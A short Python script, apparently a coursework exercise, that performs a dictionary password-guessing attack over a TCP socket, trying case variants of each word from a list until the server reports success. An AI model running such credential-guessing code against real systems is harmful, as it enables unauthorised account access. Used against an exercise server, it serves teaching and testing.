import socket
import sys
import itertools
from string import ascii_lowercase, digits

max_length = 5
max_tries = 10000000

alphabet = ascii_lowercase + digits


def brute_force():
    for i in range(1, max_length + 1):
        for password in itertools.permutations(alphabet, i):
            yield combine_tuple(password)
        for letter in alphabet:
            yield letter * i


def combine_tuple(letters: tuple):
    total = ""
    for letter in letters:
        total += letter
    return total


def password_combinations(word: str) -> str:
    string = word.lower()
    # create mask
    sample_mask = generate_mask(string)
    bitmap_length = get_bitmap_length(string)
    combinations = 2 ** bitmap_length
    if bitmap_length > 0:
        for i in range(combinations):
            bitmap = generate_bitmap(i, bitmap_length)
            mask = bitmap_to_mask(bitmap, sample_mask)
            yield mask_to_string(string, mask)
    else:
        yield word.rstrip('\n')


def generate_mask(string: str) -> list:
    mask = []
    for char in string:
        if char in ascii_lowercase:
            mask.append(0)
        else:
            mask.append(-1)
    return mask


def get_bitmap_length(string: str) -> int:
    total = 0
    for char in string:
        if char in ascii_lowercase:
            total += 1
    return total


def generate_bitmap(number: int, length: int) -> str:
    binary = bin(number)
    binary = binary[2:]
    missing = length - len(binary)
    return '0' * missing + binary


def bitmap_to_mask(bitmap: str, mask_sample: list) -> list:
    mask = []
    j = 0
    for bit in bitmap:
        # get mask_sample[j] != -1
        while mask_sample[j] == -1:
            j += 1
            mask.append(-1)
        mask.append(bit)
        j += 1
    return mask


def mask_to_string(string: str, mask: list) -> str:
    total = ""
    for char, bit in zip(string, mask):
        if bit == "1":
            total += char.upper()
        else:
            total += char
    return total


if len(sys.argv) == 3:
    IP = sys.argv[1]
    port = int(sys.argv[2])
    success = False

    with socket.socket() as my_socket:
        address = (IP, port)
        my_socket.connect(address)
        # create generator
        with open("passwords.txt", 'r') as passwords:
            for line in passwords:
                for password in password_combinations(line):
                    data = password.encode()
                    my_socket.send(data)
                    response = my_socket.recv(1024).decode()
                    if response == "Connection success!":
                        print(password)
                        success = True
                        break
                if success:
                    break

else:
    with open("passwords.txt", 'r') as passwords:
        for line in passwords:
            for password in password_combinations(line):
                print(password)
